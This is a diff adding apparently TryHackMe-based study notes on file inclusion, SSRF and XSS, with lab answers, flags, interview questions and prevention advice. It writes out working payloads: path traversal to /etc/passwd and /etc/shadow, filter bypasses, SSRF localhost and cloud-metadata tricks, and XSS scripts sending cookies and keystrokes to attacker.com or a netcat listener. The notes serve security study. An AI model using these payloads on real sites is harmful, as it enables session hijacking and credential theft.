@@ -2508,5 +2508,772 @@ Q: How to prevent IDOR?
 A: Enforce server-side authorization checks.
 
 Day 13
+File Inclusion (LFI, RFI & Path Traversal)
+📌 Overview
 
+File Inclusion vulnerabilities occur when a web application allows user input to control file paths without proper validation.
+
+These vulnerabilities include:
+
+Path Traversal (Directory Traversal)
+
+Local File Inclusion (LFI)
+
+Remote File Inclusion (RFI)
+
+If exploited successfully, attackers can:
+
+Read sensitive files
+
+Leak credentials
+
+Access source code
+
+Gain Remote Command Execution (RCE)
+
+🧠 Why File Inclusion Happens
+
+Main Cause:
+
+❌ Poor input validation
+❌ Trusting user-controlled parameters
+❌ Unsafe PHP functions like:
+
+include()
+
+require()
+
+file_get_contents()
+
+Example vulnerable code:
+
+include($_GET["file"]);
+
+1️⃣ Path Traversal (Directory Traversal)
+What is it?
+
+Path traversal allows attackers to access files outside the web root directory using:
+
+../
+
+
+Example attack:
+
+/get.php?file=../../../../etc/passwd
+
+
+Each ../ moves one directory up.
+
+🔥 PHP Function Causing It:
+file_get_contents()
+
+Common Sensitive Files (Linux)
+/etc/passwd
+/etc/shadow
+/root/.ssh/id_rsa
+/var/log/apache2/access.log
+/proc/version
+
+🧪 Lab #1 Payload
+/lab1.php?file=/etc/passwd
+
+2️⃣ Local File Inclusion (LFI)
+
+LFI occurs when a local file is included inside the application.
+
+Example vulnerable code:
+
+include("languages/" . $_GET['lang']);
+
+
+Attack:
+
+?lang=../../../../etc/passwd
+
+🧪 Lab #2
+
+Directory inside include function:
+
+includes
+
+3️⃣ LFI Filter Bypass Techniques
+🔹 Null Byte Injection (%00)
+
+Used to terminate forced extensions.
+
+Example:
+
+../../../../etc/passwd%00
+
+
+⚠️ Works only in PHP < 5.3.4
+
+🔹 Current Directory Trick
+/etc/passwd/.
+
+
+or
+
+/etc/passwd/..
+
+🔹 Filter Bypass Using Double Encoding
+
+If ../ is filtered:
+
+Use:
+
+....//....//....//etc/passwd
+
+🧪 Lab #3 Payload
+/lab3.php?file=../../../../etc/passwd
+
+🧪 Lab #4 Function Causing Issue
+file_get_contents
+
+🧪 Lab #6 Required Directory
+THM-profile
+
+🧪 /etc/os-release VERSION_ID
+12.04
+
+4️⃣ Remote File Inclusion (RFI)
+
+RFI allows inclusion of remote files hosted on another server.
+
+Requires:
+
+allow_url_fopen = On
+
+
+Example:
+
+?lang=http://attacker.thm/cmd.txt
+
+
+Attacker's file:
+
+<?php echo "Hello THM"; ?>
+
+
+If vulnerable → code executes on server.
+
+🔥 RFI Impact
+
+Remote Command Execution (RCE)
+
+Data disclosure
+
+XSS
+
+DoS
+
+🧪 RCE Output (hostname command)
+lfi-vm-thm-f8c5b1a78692
+
+🧩 Challenge Flags
+
+Flag1:
+
+F1x3d-iNpu7-f0rrn
+
+
+Flag2:
+
+c00k13_i5_yuMmy1
+
+
+Flag3:
+
+P0st_1s_w0rk1in9
+
+🎯 How to Detect File Inclusion
+
+✔ Look for file parameters
+✔ Try invalid inputs
+✔ Observe error messages
+✔ Check forced file extensions
+✔ Test traversal payloads
+✔ Analyze server response carefully
+
+🛡️ Prevention & Remediation
+
+Developers should:
+
+Validate and sanitize input
+
+Implement strict whitelisting
+
+Disable allow_url_include
+
+Turn off PHP error messages
+
+Use WAF
+
+Use absolute paths internally
+
+Apply least privilege principles
+
+🚨 Real-World Impact
+
+File Inclusion can lead to:
+
+Full server compromise
+
+Credential theft
+
+Data breach
+
+RCE
+
+Privilege escalation
+
+📚 Interview Quick Questions
+
+Q: Difference between LFI & RFI?
+LFI → Local files
+RFI → Remote hosted files
+
+Q: What enables RFI in PHP?
+allow_url_fopen
+
+Q: Is Base64 protection?
+No, encoding ≠ security
+
+Q: What is the most dangerous outcome?
+Remote Command Execution (RCE)
+
+🧠 Key Takeaways
+
+Never trust user input
+
+Encoding and hashing are not access control
+
+Error messages leak valuable info
+
+Input validation must be server-side
+
+File inclusion can escalate to RCE
+
+Day 13
+Server-Side Request Forgery (SSRF)
+📌 Overview
+
+SSRF (Server-Side Request Forgery) is a vulnerability that allows an attacker to force the web server to make HTTP requests to internal or external resources of the attacker's choosing.
+
+Instead of the attacker directly accessing internal resources,
+👉 the server does it on behalf of the attacker.
+
+🧠 What is SSRF?
+
+SSRF stands for:
+
+Server-Side Request Forgery
+
+
+It occurs when:
+
+A web application fetches a resource based on user-supplied input
+
+That input is not properly validated
+
+The attacker manipulates the request destination
+
+🔥 Types of SSRF
+1️⃣ Regular SSRF
+
+Response is returned to attacker
+
+Easier to detect
+
+Data visible in browser
+
+2️⃣ Blind SSRF
+
+No response returned
+
+Requires external monitoring
+
+Harder to detect
+
+Uses tools like:
+
+Burp Collaborator
+
+requestbin
+
+Custom HTTP listener
+
+🚨 Impact of SSRF
+
+Successful SSRF can lead to:
+
+Access to internal services
+
+Access to admin panels
+
+Exposure of credentials/tokens
+
+Cloud metadata leakage
+
+Internal network scanning
+
+Privilege escalation
+
+🧪 SSRF Example Flag
+THM{SSRF_MASTER}
+
+🔎 Finding SSRF Vulnerabilities
+
+Common places to look:
+
+1️⃣ Full URL parameter
+?url=https://example.com/file
+
+2️⃣ Hidden form fields
+3️⃣ Hostname parameter
+?srv=filestorage.cloud.thm
+
+4️⃣ Partial path input
+🎯 Most Likely Vulnerable Example
+https://website.thm/fetch-file.php?fname=242533.pdf&srv=filestorage.cloud.thm&port=8001
+
+
+Reason:
+
+User controls hostname
+
+User controls port
+
+Server likely makes backend request
+
+🛡️ SSRF Defenses & Bypass Techniques
+
+Security-aware developers may implement:
+
+🔴 Deny List
+
+Blocks specific domains/IPs like:
+
+localhost
+127.0.0.1
+169.254.169.254
+
+🚨 Bypass Techniques
+
+Alternative localhost references:
+
+127.1
+0.0.0.0
+2130706433
+017700000001
+127.0.0.1.nip.io
+
+
+Cloud Metadata IP:
+
+169.254.169.254
+
+🟢 Allow List
+
+Only allows specific domains:
+
+Example rule:
+
+URL must start with https://website.thm
+
+🚨 Bypass:
+https://website.thm.attacker.com
+
+🔄 Open Redirect (Powerful Bypass)
+
+If strict filtering exists, attacker can:
+
+Use allowed domain
+
+Redirect internally to malicious target
+
+Example:
+
+https://website.thm/link?url=https://attacker.com
+
+
+Answer:
+
+Open Redirect
+
+☁️ Cloud SSRF Target
+
+Sensitive metadata IP:
+
+169.254.169.254
+
+
+Contains:
+
+IAM credentials
+
+API keys
+
+Instance data
+
+Secrets
+
+🧪 Practical SSRF Walkthrough
+
+Scenario:
+
+Two endpoints discovered:
+
+/private
+/customers/new-account-page
+
+
+/private → blocked from public IP
+
+Avatar feature loads images via backend request.
+
+🚀 Exploit Method
+
+Inspect avatar form
+
+Modify avatar value
+
+Set value to:
+
+x/../private
+
+
+Why it works:
+
+../ moves directory up
+
+Bypasses deny list rule blocking /private
+
+Server fetches internal resource
+
+Content returned as base64
+
+🔓 Decoded Flag
+THM{YOU_WORKED_OUT_THE_SSRF}
+
+🧠 Detection Strategy
+
+✔ Look for URL-based parameters
+✔ Modify hostnames
+✔ Try internal IPs
+✔ Test localhost variants
+✔ Use Burp Collaborator for blind SSRF
+✔ Attempt metadata IP
+
+🛡️ Prevention
+
+Developers should:
+
+Implement strict allow lists
+
+Validate DNS resolution
+
+Block internal IP ranges
+
+Disable unnecessary protocols
+
+Prevent open redirects
+
+Use network segmentation
+
+Block access to metadata endpoint
+
+🎯 Interview Quick Questions
+
+Q: Difference between SSRF and Blind SSRF?
+Regular → Response visible
+Blind → No response returned
+
+Q: Most common cloud SSRF target?
+169.254.169.254
+
+Q: What bypass works against strict rules?
+Open Redirect
+
+Q: What makes SSRF dangerous?
+Internal network access + credential leakage
+
+🧩 Key Takeaways
+
+SSRF attacks server-to-server trust
+
+Cloud environments increase impact
+
+Deny lists are weak
+
+Open redirects are powerful bypass tools
+
+SSRF can escalate to full compromise
+
+🔥 Done.
+
+তোমার Web-Application-Security folder এখন already strong হচ্ছে:
+
+Authentication-Bypass.md
+Content-Discovery.md
+Subdomain-Enumeration.md
+IDOR.md
+File-Inclusion.md
+SSRF.md
+
+Day 14
+Cross-Site Scripting (XSS)
+📌 Overview
+
+Cross-Site Scripting (XSS) is an injection vulnerability where malicious JavaScript is injected into a web application and executed in another user’s browser.
+
+XSS is one of the most common web vulnerabilities and part of OWASP Top 10.
+
+🧠 What Does XSS Stand For?
+Cross-Site Scripting
+
+💥 What is a Payload?
+
+In XSS, a payload is the malicious JavaScript code executed in the victim’s browser.
+
+A payload has:
+
+🎯 Intention (what it does)
+
+🔧 Modification (how it bypasses filters)
+
+🎯 Common XSS Payload Intentions
+1️⃣ Proof of Concept (PoC)
+<script>alert('XSS');</script>
+
+
+Used to demonstrate vulnerability.
+
+2️⃣ Session Stealing
+<script>fetch('https://attacker.com?cookie=' + btoa(document.cookie));</script>
+
+
+Steals:
+
+document.cookie
+
+3️⃣ Keylogger
+<script>
+document.onkeypress = function(e) {
+ fetch('https://attacker.com?key=' + btoa(e.key));
+}
+</script>
+
+4️⃣ Business Logic Abuse
+<script>user.changeEmail('attacker@evil.com');</script>
+
+🔍 Important Interview Points
+
+Which document property stores session tokens?
+
+document.cookie
+
+
+Which JS method is common PoC?
+
+alert()
+
+🟥 Types of XSS
+1️⃣ Reflected XSS
+What is it?
+
+User input reflected immediately in response without validation.
+
+Example:
+https://site.com?error=YOUR_INPUT
+
+Where to test?
+
+URL parameters
+
+URL path
+
+Headers (rare)
+
+Impact:
+
+Session hijacking
+
+Credential theft
+
+Malicious redirects
+
+2️⃣ Stored XSS
+What is it?
+
+Payload stored in:
+
+Database
+
+
+Then executed when other users view content.
+
+Common Injection Points:
+
+Blog comments
+
+Profile fields
+
+Support tickets
+
+Reviews
+
+Impact:
+
+Persistent session theft
+
+Mass exploitation
+
+3️⃣ DOM-Based XSS
+What is DOM?
+
+Document Object Model.
+
+DOM XSS happens entirely in browser JavaScript.
+
+No backend involvement.
+
+Example:
+document.write(window.location.hash);
+
+
+If attacker controls window.location.hash, they control DOM.
+
+Dangerous JS Methods:
+eval()
+
+
+Also:
+
+innerHTML
+
+document.write
+
+setTimeout
+
+setInterval
+
+4️⃣ Blind XSS
+
+Similar to Stored XSS, but:
+
+Attacker cannot see execution
+
+Payload executes in admin/staff panel
+
+Detection Tool:
+XSS Hunter Express
+
+🧪 Practical Payload Escaping (Lab Summary)
+🔹 Level 1 – Direct Injection
+<script>alert('THM');</script>
+
+🔹 Level 2 – Escape Input Value
+"><script>alert('THM');</script>
+
+🔹 Level 3 – Escape Textarea
+</textarea><script>alert('THM');</script>
+
+🔹 Level 4 – Break JavaScript Context
+';alert('THM');//
+
+🔹 Level 5 – Filter Bypass
+
+Original:
+
+<script>alert('THM');</script>
+
+
+Bypass trick:
+
+<sscriptcript>alert('THM');</sscriptcript>
+
+
+Filter removes inner "script" → becomes valid <script>
+
+🔹 Level 6 – Event Handler Injection
+/images/cat.jpg" onload="alert('THM');
+
+
+Uses:
+
+onload event
+
+🧠 XSS Polyglot
+
+Works in multiple contexts:
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//...
+
+
+Advanced filter bypass technique.
+
+🏁 Final Lab Flag
+THM{XSS_MASTER}
+
+🔥 Blind XSS Practical (Support Ticket Exploit)
+Step 1: Escape textarea
+</textarea><script>alert('THM');</script>
+
+Step 2: Exfiltrate Cookie
+</textarea>
+<script>
+fetch('http://IP:9001?cookie=' + btoa(document.cookie));
+</script>
+
+Step 3: Netcat Listener
+nc -nlvp 9001
+
+Stolen Cookie (Decoded)
+4AB305E55955197693F01D6F8FD2D321
+
+🚨 Impact of XSS
+
+Session hijacking
+
+Credential theft
+
+CSRF token theft
+
+Admin account takeover
+
+Keylogging
+
+Malware injection
+
+🛡️ Prevention
+
+Output encoding
+
+Content Security Policy (CSP)
+
+HttpOnly cookies
+
+Input validation
+
+Escape user-controlled data
+
+Avoid unsafe JS methods
+
+🎯 Interview Rapid Fire
+
+Difference between Reflected & Stored XSS?
+Reflected → Immediate
+Stored → Persistent
+
+Difference between Stored & Blind XSS?
+Blind → Cannot see execution
+
+Most dangerous JS method?
+eval()
+
+Where are session tokens stored?
+document.cookie
+
+Day 15
 
